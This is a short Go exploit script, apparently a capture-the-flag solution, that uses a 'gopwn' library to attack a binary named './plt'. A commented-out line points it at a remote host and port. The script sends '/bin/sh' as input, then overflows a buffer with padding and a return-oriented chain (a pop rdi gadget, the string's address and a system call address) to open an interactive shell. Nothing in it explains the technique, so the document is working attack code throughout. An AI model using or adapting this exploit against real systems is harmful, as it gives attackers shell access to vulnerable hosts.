package main

import(
  "gopwn"
  "strings"
)

func main(){
  conn, _ := Process("./plt")
  //conn, _ := Remote("140.110.112.223:2120")

  pop_rdi := 0x0000000000400773
  name := 0x601070
  main_system := 0x004006bf

  conn.RecvuntilByte('?')
  conn.Sendline("/bin/sh")

  conn.RecvuntilByte('?')
  conn.Sendline(strings.Repeat("a", 0x38) + P64(pop_rdi) + P64(name) + P64(main_system))

  conn.Interactive()
  conn.Close()
}
